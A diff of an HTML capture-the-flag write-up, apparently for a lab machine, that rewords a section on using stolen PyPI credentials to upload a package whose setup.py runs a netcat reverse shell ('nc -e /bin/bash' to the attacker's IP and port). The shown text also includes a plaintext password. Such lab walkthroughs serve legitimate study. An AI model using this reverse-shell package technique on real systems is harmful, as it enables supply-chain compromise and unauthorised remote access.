@@ -132,8 +132,7 @@ body {
  				password:	soufianeelhaoui				<br/><br/>
 				</code><br/><br/><br/>
 																  
-				With our newfound pypi creds in hand, we turn to the pypi documentation to figure out how to upload a package. 			<br/>
-				There are 2 files we need to setup.												<br/>
+				Now that we have pypi creds, we turn to the pypi documentation to figure out how to upload a package. There are 2 files we need to setup.<br/>												<br/>
 					
 				<u1>
 					<li> <b>.pypirc</b> -- config</li> 
@@ -150,15 +149,14 @@ body {
 				We can setup a pypirc with the connection info and creds we already have.							<br/><br/>
 				<img src="images/sneaky/pypirc.PNG" alt="pypirc" class="inline"/>								<br/><br/><br/>
 					
-				Inside of setup.py, we will run a simple netcat one liner to send a /bin/bash session back to our kali	. 			<br/>
-				The command I will use is													<br/><br/><br/>
+				Inside of setup.py, we will run a simple netcat one liner to send a /bin/bash session back to our kali. The command I will use is <br/><br/><br/>
 				
 				<code>
 				nc -e /bin/bash (my-ip-goes-here) (my-port-goes-here)
 				</code>  <br/><br/><br/>
 					
-				So I created my setup.py like below												<br/><br/>
-				<img src="images/sneaky/setup-old.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
+				I created my setup.py like below												<br/><br/>
+				<img src="images/sneaky/setup-initial.PNG" alt="setup.py" class="inline"/>								<br/><br/><br/>
 					
 					
 				At this point uploading a pypi package with the above two files results in catching yet another shell as the dev user.		<br/>
